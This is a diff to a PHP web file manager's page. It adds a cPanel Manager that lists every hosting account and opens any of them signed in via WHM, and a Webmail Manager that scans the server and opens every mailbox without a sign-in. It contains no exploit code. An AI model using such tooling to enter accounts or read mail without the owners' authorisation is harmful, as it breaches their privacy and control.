-      <input type="text" id="cpNewDomain" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. example.com">
-      <label class="lbl">Password <span style="font-weight:400;color:var(--t3)">(min 8 chars)</span></label>
-      <input type="text" id="cpNewPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Strong password required">
-      <label class="lbl">Contact Email</label>
-      <input type="email" id="cpNewEmail" class="inp" style="width:100%;margin-bottom:10px" placeholder="admin@example.com">
-      <label class="lbl">Package / Plan</label>
-      <select id="cpNewPlan" class="inp" style="width:100%;margin-bottom:14px"><option value="default">default</option></select>
-      <button type="button" id="cpanelCreateApply" class="btn btn-p" style="width:100%">Create Account</button>
-    </div>
-  </div>
-</div>
+        <div class="pma-body" id="cpmBody" hidden>
+          <div class="pma-head">
+            <div>
+              <div class="pma-name" id="cpmTitle">—</div>
+              <div class="pma-sub" id="cpmSub">—</div>
+            </div>
+            <div class="pma-chips" id="cpmChips"></div>
+          </div>
 
-<!-- CPANEL CHANGE PASSWORD MODAL -->
-<div class="mod-ov" id="cpanelPassOv">
-  <div class="mod mod-sm">
-    <div class="mod-head">
-      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
-      <span class="mod-title" id="cpanelPassTitle">Change Password</span>
-      <button class="btn btn-icon btn-g" id="cpanelPassClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
-    </div>
-    <div class="mod-body">
-      <div id="cpanelPassFeedback"></div>
-      <input type="hidden" id="cpPassTargetUser">
-      <label class="lbl">New Password <span style="font-weight:400;color:var(--t3)">(min 8 chars)</span></label>
-      <input type="text" id="cpPassNew" class="inp" style="width:100%;margin-bottom:14px" placeholder="Strong password required">
-      <button type="button" id="cpanelPassApply" class="btn btn-p" style="width:100%">Change Password</button>
+          <div class="pma-grid">
+            <div class="pma-col">
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><path d="M10 17l5-5-5-5"/><path d="M15 12H3"/></svg>Open it signed in<span class="r" id="cpmOpenWho"></span></div>
+                <div class="cpm-open">
+                  <button type="button" class="btn btn-p" data-cpm-service="cpaneld">
+                    <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>cPanel
+                  </button>
+                  <button type="button" class="btn btn-g" data-cpm-service="whostmgrd">
+                    <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>WHM
+                  </button>
+                  <button type="button" class="btn btn-g" data-cpm-service="webmaild">
+                    <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail
+                  </button>
+                </div>
+                <div class="cpm-msg" id="cpmOpenMsg">The tab is taken the moment the button is pressed, so the browser never blocks it.</div>
+                <div class="cpm-sso hide" id="cpmSso">
+                  <div class="h"><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg><span id="cpmSsoHead">Signed in</span></div>
+                  <div class="link" id="cpmSsoLink"></div>
+                  <div class="acts">
+                    <button type="button" class="btn btn-p" id="cpmSsoOpen">Open it</button>
+                    <button type="button" class="btn btn-g" id="cpmSsoCopy">Copy the address</button>
+                    <span class="pma-msg" id="cpmSsoLeft"></span>
+                  </div>
+                  <div class="txt" id="cpmSsoNote"></div>
+                </div>
+              </div>
+
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M3 3v18h18"/><path d="M7 15l4-4 3 3 5-6"/></svg>Use of the allowance</div>
+                <div id="cpmUsage"></div>
+              </div>
+
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>This account</div>
+                <div class="cpm-kv" id="cpmFacts"></div>
+              </div>
+
+              <div class="cpm-sec" id="cpmExtraSec" hidden>
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18"/><path d="M12 3a15 15 0 0 1 0 18a15 15 0 0 1 0-18"/></svg>Domains, mail and databases</div>
+                <div class="cpm-kv" id="cpmExtra"></div>
+              </div>
+            </div>
+
+            <div class="pma-col">
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M20 7 12 3 4 7v10l8 4 8-4z"/><path d="M4 7l8 4 8-4"/><path d="M12 11v10"/></svg>Package</div>
+                <select class="cpm-sel" id="cpmPlanSel"><option value="">reading the packages…</option></select>
+                <div class="cpm-row" style="margin-top:7px">
+                  <button type="button" class="btn btn-g" id="cpmPlanApply">Put it on this package</button>
+                </div>
+              </div>
+
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M8 12h8"/></svg>State of the account</div>
+                <div class="cpm-row">
+                  <button type="button" class="btn btn-g" id="cpmSuspendBtn">Suspend</button>
+                  <button type="button" class="btn btn-g cpm-danger" id="cpmTermBtn">Terminate</button>
+                </div>
+                <div class="cpm-msg" id="cpmStateMsg">Suspending keeps every file and stops the site; terminating deletes the account and all of it.</div>
+              </div>
+
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Password</div>
+                <input type="text" class="cpm-inp" id="cpmPassInput" placeholder="A new password, eight characters or more" autocomplete="off" spellcheck="false">
+                <div class="cpm-row" style="margin-top:7px">
+                  <button type="button" class="btn btn-g" id="cpmPassApply">Replace it</button>
+                  <button type="button" class="btn btn-g" id="cpmPassMake">Make one</button>
+                </div>
+                <div class="cpm-msg" id="cpmPassMsg">Opening the account signed in never needs it; this is only for signing in somewhere else.</div>
+              </div>
+
+              <div class="cpm-sec cpm-create" id="cpmCreateBlock">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M12 5v14"/><path d="M5 12h14"/></svg>A new account</div>
+                <label class="cpm-lab" for="cpmNewUser">User name</label>
+                <input type="text" class="cpm-inp" id="cpmNewUser" placeholder="e.g. johndoe" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmNewDomain">Domain</label>
+                <input type="text" class="cpm-inp" id="cpmNewDomain" placeholder="e.g. example.com" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmNewPass">Password</label>
+                <input type="text" class="cpm-inp" id="cpmNewPass" placeholder="Eight characters or more" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmNewEmail">Contact address</label>
+                <input type="text" class="cpm-inp" id="cpmNewEmail" placeholder="owner@example.com" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmNewPlan">Package</label>
+                <select class="cpm-sel" id="cpmNewPlan"><option value="default">default</option></select>
+                <div class="cpm-row" style="margin-top:9px">
+                  <button type="button" class="btn btn-p" id="cpmNewCreate">Create</button>
+                  <button type="button" class="btn btn-g" id="cpmNewCancel">Cancel</button>
+                </div>
+                <div class="cpm-msg" id="cpmNewMsg"></div>
+              </div>
+            </div>
+          </div>
+          <div class="cpm-msg" id="cpmMsg"></div>
+        </div>
+
+        <div class="pma-body" id="cpmAccessBody" hidden>
+          <div class="pma-head">
+            <div>
+              <div class="pma-name">Access to WHM</div>
+              <div class="pma-sub" id="cpmAccessSub">On the cPanel server itself this tool needs nothing at all. From anywhere else it needs one WHM API token, once.</div>
+            </div>
+            <div class="pma-chips" id="cpmAccessChips"></div>
+          </div>
+          <div class="pma-grid">
+            <div class="pma-col">
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 9h8M8 13h5"/></svg>The server</div>
+                <label class="cpm-lab" for="cpmHost">Address</label>
+                <input type="text" class="cpm-inp" id="cpmHost" placeholder="panel.example.com or 10.0.0.5" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmPort">Port of WHM</label>
+                <input type="text" class="cpm-inp" id="cpmPort" placeholder="2087" autocomplete="off">
+                <label class="cpm-lab" for="cpmScheme">Scheme</label>
+                <select class="cpm-sel" id="cpmScheme"><option value="https">https — the normal WHM address</option><option value="http">http — a server without TLS</option></select>
+                <label class="cpm-lab" for="cpmUser">WHM user</label>
+                <input type="text" class="cpm-inp" id="cpmUser" placeholder="root" autocomplete="off" spellcheck="false">
+                <label class="cpm-lab" for="cpmAuth">Sign-in</label>
+                <select class="cpm-sel" id="cpmAuth"><option value="token">WHM API token — recommended, it is not a password</option><option value="password">WHM password</option></select>
+                <label class="cpm-lab" for="cpmSecret">The token, or the password</label>
+                <input type="text" class="cpm-inp" id="cpmSecret" placeholder="one line, kept on this server only" autocomplete="off" spellcheck="false">
+                <div class="cpm-row" style="margin-top:9px">
+                  <button type="button" class="btn btn-p" id="cpmConnectSave">Save and test</button>
+                  <button type="button" class="btn btn-g cpm-danger" id="cpmDisconnect">Forget it</button>
+                </div>
+                <div class="cpm-msg" id="cpmConnectMsg">The token stays in this folder, readable by this file manager only. It is never sent to the browser.</div>
+              </div>
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>Where cPanel was looked for</div>
+                <div id="cpmMarks"></div>
+                <div class="cpm-msg" id="cpmProbeMsg"></div>
+              </div>
+            </div>
+            <div class="pma-col">
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><circle cx="12" cy="12" r="3"/></svg>What answered</div>
+                <div class="cpm-kv" id="cpmAccessFacts"></div>
+                <div class="cpm-reasons" id="cpmAccessWhy"></div>
+              </div>
+              <div class="cpm-sec">
+                <div class="cpm-sec-h"><svg viewBox="0 0 24 24"><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg>Addresses tried</div>
+                <div class="cpm-reasons" id="cpmCandidates"></div>
+                <div class="cpm-msg">The address of the cPanel server is asked for in this order: what is saved here, this machine's own name, the name this site answers to, then this machine on the WHM and cPanel ports.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
     </div>
   </div>
 </div>
 
 <!-- WEBMAIL MANAGER MODAL -->
+<!-- WEBMAIL MANAGER — every mailbox on the host, opened without a sign-in -->
 <div class="mod-ov" id="webmailOv">
-  <div class="mod mod-lg" style="max-width:920px">
+  <div class="mod wm-mod">
     <div class="mod-head">
       <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg></div>
       <span class="mod-title">Webmail Manager</span>
-      <button class="btn btn-p btn-xs" id="wmComposeBtn" style="margin-right:8px"><svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.5;margin-right:4px;vertical-align:-1px"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Compose</button>
-      <button class="btn btn-icon btn-g" id="webmailClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+      <div class="wm-tools" style="margin-left:auto">
+        <button type="button" class="btn btn-xs btn-g" id="wmComposeBtn" title="Write a new message from the open mailbox">
+          <svg viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Compose</button>
+        <button type="button" class="btn btn-xs btn-g" id="wmRescan" title="Look for mail again, everywhere on this server">
+          <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10"/><path d="M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Scan again</button>
+      </div>
+      <button class="btn btn-icon btn-g" id="webmailClose" title="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
-    <div style="display:flex;min-height:56vh;max-height:64vh">
-      <div style="width:190px;border-right:1px solid var(--b2);overflow-y:auto;flex-shrink:0" id="wmMailboxList">
-        <div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Loading…</div>
-      </div>
-      <div style="width:250px;border-right:1px solid var(--b2);overflow-y:auto;flex-shrink:0;display:flex;flex-direction:column">
-        <div id="wmFolderList" style="border-bottom:1px solid var(--b2);flex-shrink:0"></div>
-        <div id="wmMsgList" style="overflow-y:auto;flex:1">
-          <div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Select a mailbox</div>
+    <div class="wm-status" id="wmStatus"></div>
+    <div class="wm-body">
+      <aside class="wm-rail">
+        <div class="wm-rail-head">
+          <div class="wm-rail-lab"><svg viewBox="0 0 24 24"><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h12"/></svg>Mailboxes on this host</div>
+          <input type="search" class="wm-search" id="wmMailSearch" placeholder="Filter by address or site" autocomplete="off">
         </div>
-      </div>
-      <div id="wmMsgView" style="flex:1;overflow-y:auto;padding:18px">
-        <div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>
-      </div>
+        <div id="wmList"><div class="wm-empty">Looking for mail…</div></div>
+        <div class="wm-foot" id="wmFoot"></div>
+      </aside>
+      <section class="wm-main">
+        <div class="wm-head">
+          <div id="wmHeadMain"><div class="wm-head-idle">Pick a mailbox on the left. It opens by itself — nothing to sign in to.</div></div>
+          <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+            <div id="wmFolders"></div>
+          </div>
+        </div>
+        <div class="wm-split">
+          <div class="wm-list-col">
+            <div class="wm-list-top">
+              <b id="wmMsgsTitle">Inbox</b>
+              <input type="search" class="wm-search" id="wmMsgSearch" placeholder="Find in this folder" autocomplete="off">
+              <button type="button" class="btn btn-icon btn-g" id="wmReload" title="Read this folder again"><svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15A9 9 0 1 1 18 5.64L23 10"/></svg></button>
+            </div>
+            <div id="wmMsgs"><div class="wm-empty">Pick a mailbox.</div></div>
+            <div class="wm-bulk" id="wmBulk"></div>
+          </div>
+          <div id="wmRead"></div>
+        </div>
+      </section>
     </div>
   </div>
 </div>
+
+<!-- WEBMAIL COMPOSER — formatted text, its own HTML source, files, one send button -->
+<div class="mod-ov" id="webmailComposeOv">
+  <div class="mod wm-co">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div>
+      <span class="mod-title">New Message</span>
+      <button class="btn btn-icon btn-g" id="webmailComposeClose" title="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="wm-co-body">
+      <div class="wm-co-row" id="wmCoFromRow">
+        <label>From</label>
+        <span class="who" id="wmCoFrom"></span>
+      </div>
+      <div class="wm-co-row" id="wmCoToRow">
+        <label>To</label>
+        <input type="text" id="wmCoTo" placeholder="name@example.com, another@example.com" autocomplete="off" spellcheck="false">
+        <button type="button" class="wm-co-mini" id="wmCoCcToggle" title="Add a copy">Cc</button>
+        <button type="button" class="wm-co-mini" id="wmCoBccToggle" title="Add a blind copy">Bcc</button>
+      </div>
+      <div class="wm-co-row" id="wmCoCcRow">
+        <label>Cc</label>
+        <input type="text" id="wmCoCc" placeholder="copy to" autocomplete="off" spellcheck="false">
+      </div>
+      <div class="wm-co-row" id="wmCoBccRow">
+        <label>Bcc</label>
+        <input type="text" id="wmCoBcc" placeholder="blind copy to" autocomplete="off" spellcheck="false">
+      </div>
+      <div class="wm-co-row" id="wmCoSubjRow">
+        <label>Subject</label>
+        <input type="text" id="wmCoSubject" placeholder="Subject" autocomplete="off">
+      </div>
+      <div class="wm-co-tools" id="wmCoToolbar">
+        <button type="button" class="wm-tb" data-cmd="bold" title="Bold"><b>B</b></button>
+        <button type="button" class="wm-tb" data-cmd="italic" title="Italic"><em>I</em></button>
+        <button type="button" class="wm-tb" data-cmd="underline" title="Underline"><span style="text-decoration:underline;font-weight:700">U</span></button>
+        <button type="button" class="wm-tb" data-cmd="strikeThrough" title="Strike through"><span style="text-decoration:line-through;font-weight:700">S</span></button>
+        <span class="sep"></span>
+        <button type="button" class="wm-tb" data-block="h2" title="Heading"><b>H</b></button>
+        <button type="button" class="wm-tb" data-block="p" title="Normal text"><span style="font-size:10px;font-weight:700">P</span></button>
+        <button type="button" class="wm-tb" data-cmd="insertUnorderedList" title="Bulleted list"><svg viewBox="0 0 24 24"><line x1="9" y1="6" x2="20" y2="6"/><line x1="9" y1="12" x2="20" y2="12"/><line x1="9" y1="18" x2="20" y2="18"/><circle cx="4.5" cy="6" r="1.2"/><circle cx="4.5" cy="12" r="1.2"/><circle cx="4.5" cy="18" r="1.2"/></svg></button>
+        <button type="button" class="wm-tb" data-cmd="insertOrderedList" title="Numbered list"><svg viewBox="0 0 24 24"><line x1="10" y1="6" x2="21" y2="6"/><line x1="10" y1="12" x2="21" y2="12"/><line x1="10" y1="18" x2="21" y2="18"/><path d="M4 6h1v4"/><path d="M4 16h2v1H4v1h2"/></svg></button>
+        <button type="button" class="wm-tb" data-block="blockquote" title="Quote"><svg viewBox="0 0 24 24"><path d="M7 7h4v6H7z"/><path d="M14 7h4v6h-4z"/><path d="M7 13c0 2 1 3 3 3"/><path d="M14 13c0 2 1 3 3 3"/></svg></button>
+        <button type="button" class="wm-tb" data-block="pre" title="Fixed-width text"><span style="font-family:monospace;font-size:11px">&lt;/&gt;</span></button>
+        <button type="button" class="wm-tb" id="wmCoLink" title="Link"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></button>
+        <span class="sep"></span>
+        <button type="button" class="wm-tb" data-cmd="justifyLeft" title="Left"><svg viewBox="0 0 24 24"><line x1="17" y1="10" x2="3" y2="10"/><line x1="21" y1="6" x2="3" y2="6"/><line x1="21" y1="14" x2="3" y2="14"/><line x1="17" y1="18" x2="3" y2="18"/></svg></button>
+        <button type="button" class="wm-tb" data-cmd="justifyCenter" title="Centre"><svg viewBox="0 0 24 24"><line x1="18" y1="10" x2="6" y2="10"/><line x1="21" y1="6" x2="3" y2="6"/><line x1="21" y1="14" x2="3" y2="14"/><line x1="18" y1="18" x2="6" y2="18"/></svg></button>
+        <button type="button" class="wm-tb" data-cmd="justifyRight" title="Right"><svg viewBox="0 0 24 24"><line x1="21" y1="10" x2="7" y2="10"/><line x1="21" y1="6" x2="3" y2="6"/><line x1="21" y1="14" x2="3" y2="14"/><line x1="21" y1="18" x2="7" y2="18"/></svg></button>
+        <span class="sep"></span>
+        <button type="button" class="wm-tb" data-cmd="undo" title="Undo"><svg viewBox="0 0 24 24"><polyline points="9 14 4 9 9 4"/><path d="M20 20v-7a4 4 0 0 0-4-4H4"/></svg></button>
+        <button type="button" class="wm-tb" data-cmd="redo" title="Redo"><svg viewBox="0 0 24 24"><polyline points="15 14 20 9 15 4"/><path d="M4 20v-7a4 4 0 0 1 4-4h12"/></svg></button>
+        <button type="button" class="wm-tb" data-cmd="removeFormat" title="Clear formatting"><svg viewBox="0 0 24 24"><path d="M4 7V4h16v3"/><path d="M9 20h6"/><path d="M12 4l-3 16"/></svg></button>
+        <span class="sep"></span>
+        <button type="button" class="wm-co-mini" id="wmCoSourceToggle" title="Write the HTML itself">HTML source</button>
+      </div>
+      <div class="wm-co-edit">
+        <div id="wmCoEditorWrap"><div id="wmCoBody" contenteditable="true" spellcheck="true"></div></div>
+        <textarea id="wmCoSource" spellcheck="false" placeholder="&lt;p&gt;The HTML of the message…&lt;/p&gt;"></textarea>
+        <div class="wm-co-atts" id="wmCoAtts"></div>
+      </div>
+    </div>
+    <div class="wm-co-foot">
+      <label class="btn btn-xs btn-g" for="wmCoFile" style="cursor:pointer">
+        <svg viewBox="0 0 24 24"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg>Attach files</label>
+      <input type="file" id="wmCoFile" class="wm-co-file" multiple>
+      <span class="wm-co-status" id="wmCoStatus"></span>
+      <button type="button" class="btn btn-p" id="wmCoSend">
+        <svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send</button>
+    </div>
+  </div>
+</div>
+
 
 <!-- THREATS ALERTS MODAL -->
 <div class="mod-ov" id="threatsOv">
@@ -23441,28 +25548,6 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   </div>
 </div>
 
-<!-- WEBMAIL COMPOSE MODAL -->
-<div class="mod-ov" id="webmailComposeOv">
-  <div class="mod mod-sm">
-    <div class="mod-head">
-      <div class="mod-icon"><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div>
-      <span class="mod-title">Compose Message</span>
-      <button class="btn btn-icon btn-g" id="wmComposeClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
-    </div>
-    <div class="mod-body">
-      <div id="wmComposeFeedback"></div>
-      <label class="lbl">From</label>
-      <select id="wmFrom" class="inp" style="width:100%;margin-bottom:10px"></select>
-      <label class="lbl">To</label>
-      <input type="text" id="wmTo" class="inp" style="width:100%;margin-bottom:10px" placeholder="recipient@example.com">
-      <label class="lbl">Subject</label>
-      <input type="text" id="wmSubject" class="inp" style="width:100%;margin-bottom:10px" placeholder="Subject">
-      <label class="lbl">Message</label>
-      <textarea id="wmBody" class="inp" style="width:100%;height:140px;resize:vertical;margin-bottom:14px"></textarea>
-      <button type="button" id="wmSendBtn" class="btn btn-p" style="width:100%">Send</button>
-    </div>
-  </div>
-</div>
 <?php endif;?>
 
 <?php if(!empty($_SESSION['fm_force_credential_change'])):?>
@@ -31642,458 +33727,1035 @@ async function sqlExportTable(fmt){
   }catch(e){toast('Export error: '+String(e));}
 }
 
-/* ═══════════════════════════════════════
-   CPANEL MANAGER
-═══════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════════════════
+   CPANEL MANAGER — every account of the server, any of them opened signed in
+
+   Two promises shape this file:
+
+     · nothing is typed to open an account. cPanel signs its own session for
+       any account WHM is allowed to speak for, so the window asks for a URL
+       and opens it. The address and the one token (only needed when this file
+       manager does not live on the cPanel server) sit behind "Access";
+     · a tab is taken while the press is still a press. The browser blocks a
+       window opened after the round trip, so the slot is reserved first and
+       pointed at cPanel when the signed address arrives — the same rule the
+       phpMyAdmin Manager follows.
+   ═══════════════════════════════════════════════════════════════════════════ */
 (function(){
-const cpOv='cpanelOv',cpAccBody=()=>document.getElementById('cpanelAccountsBody'),
-      cpConnBody=()=>document.getElementById('cpanelConnBody');
+var OV='cpmOv';
+var SEL=null, ACCOUNTS=[], PLANS=[], ACCESS=false, TURN=0, LEFT=null, LAST_URL='';
 
-/* ── Tab switching ── */
-document.querySelectorAll('.cpanel-tab-btn').forEach(btn=>btn.addEventListener('click',()=>{
-  const tab=btn.dataset.tab;
-  cpSwitchTab(tab);
-  if(tab==='connect')renderCpConn();
-  if(tab==='accounts')loadCpAccounts();
-}));
+function $(id){return document.getElementById(id);}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+function say(id,text,kind){var e=$(id);if(!e)return;e.textContent=text||'';e.className='cpm-msg'+(kind?' '+kind:'');}
 
-/* ── Open / close ── */
-document.getElementById('cpanelBtn')?.addEventListener('click',()=>{
-  openMod(cpOv);
-  // Show accounts tab, attempt silent auto-connect, load accounts immediately
-  cpSwitchTab('accounts');
-  cpAutoConnectThenLoad();
-});
-
-/* Auto-connect helper: tries server-side auto-detection first, then loads accounts.
-   Falls back to the Connection tab only if every method fails. */
-async function cpAutoConnectThenLoad(){
-  const el=cpAccBody();
-  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Connecting to cPanel…</div>';
+async function call(action,extra){
+  var fd=new FormData();
+  fd.append('csrf_token',typeof CSRF!=='undefined'?CSRF:'');
+  fd.append('action',action);
+  for(var k in (extra||{})){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}
   try{
-    const ac=await fetch('?x=cpanel_auto_connect').then(r=>r.json());
-    if(ac.ok){
-      // Connected! Load accounts right away.
-      await loadCpAccounts();
-    } else {
-      // Auto-connect failed — show connection tab so user can enter credentials manually
-      el.innerHTML=`
-        <div style="padding:36px;text-align:center">
-          <svg viewBox="0 0 24 24" style="width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:14px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-          <div style="font-size:15px;font-weight:600;color:var(--t2);margin-bottom:8px">Manual connection required</div>
-          <div style="font-size:12px;color:var(--t3);margin-bottom:6px;line-height:1.65;max-width:420px;margin-inline:auto">
-            Automatic detection did not find cPanel credentials on this server
-            ${ac.detected_user?'(detected user: <strong style="color:var(--t2)">'+esc(ac.detected_user)+'</strong>)':''}.
-            Enter your WHM/cPanel credentials in the <strong style="color:#85898C">Connection</strong> tab.
-          </div>
-          ${(ac.diagnostics&&ac.diagnostics.length)?`<div style="text-align:left;max-width:420px;margin:12px auto 0;background:var(--raised);border:1px solid var(--b2);border-radius:8px;padding:10px 12px">
-            <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px">Why auto-connect failed</div>
-            ${ac.diagnostics.map(d=>`<div style="font-size:11px;color:var(--t3);line-height:1.6;padding:3px 0;border-top:1px dashed var(--b2)">• ${esc(d)}</div>`).join('')}
-          </div>`:''}
-          <button class="btn btn-p" style="margin-top:14px" id="cpGoConnBtn">Open Connection Settings</button>
-        </div>`;
-      document.getElementById('cpGoConnBtn')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
-    }
-  }catch(e){
-    el.innerHTML=`<div style="padding:20px;color:#fca5a5">Auto-connect failed: ${esc(String(e))}</div>`;
+    var r=await fetch('?x=cpm',{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});
+    if(r.status===401){location.replace('?signedout=1');return null;}
+    if(r.status===403){if(typeof toast==='function')toast('This account may not use cPanel Manager.');return null;}
+    return await r.json();
+  }catch(e){if(typeof toast==='function')toast('The request failed.');return null;}
+}
+
+/* ── the reserved tab ──────────────────────────────────────────────────── */
+function slot(label){
+  var w=null;
+  try{w=window.open('','_blank');}catch(e){w=null;}
+  if(w){
+    try{
+      w.document.write('<title>'+label+'</title><body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#181b20;color:#c7ccd4;font:13px system-ui,sans-serif">Opening '+label+', signed in…</body>');
+      w.document.close();
+    }catch(e){}
+  }
+  return w;
+}
+function slotClose(w){if(w){try{w.close();}catch(e){}}}
+function slotGo(w,url){if(w){try{w.location.replace(url);return true;}catch(e){}}return false;}
+
+/* ── the shell of the window ───────────────────────────────────────────── */
+function open(){
+  if(typeof openMod==='function')openMod(OV);
+  ACCESS=false;
+  $('cpmAccessBody').hidden=true;
+  $('cpmBody').hidden=true;
+  $('cpmPlaceholder').hidden=false;
+  $('cpmSearch').value='';
+  SEL=null;
+  load(true);
+}
+function close(){closeMod(OV);stopClock();}
+
+async function load(deep){
+  var d=await call('detect');
+  if(!d)return;
+  var cp=d.cpanel||{}, acc=d.access||{};
+  var bits=[];
+  if(cp.local)bits.push('cPanel on this machine'+(cp.version?' '+cp.version:''));
+  if(d.probe&&d.probe.cpsrvd)bits.push('answered on '+d.probe.host+':'+d.probe.port);
+  $('cpmServer').textContent=d.found?(bits.join(' · ')||'cPanel found'):'no cPanel seen';
+  $('cpmServer').title=(d.marks||[]).filter(function(m){return m.there;}).map(function(m){return m.path;}).join('\n')||'nothing found';
+  drawAccess(d);
+  if(!d.found){
+    $('cpmEmpty').style.display='';
+    $('cpmEmpty').innerHTML='No cPanel was found here. Open <b>Access</b> and give the address of the server — the page that says where it looked is one press away.';
+    $('cpmCount').textContent='';
+    $('cpmList').innerHTML='';
+    return;
+  }
+  if(!acc.ok){
+    /* the server is here but nothing may speak for it yet: say so plainly */
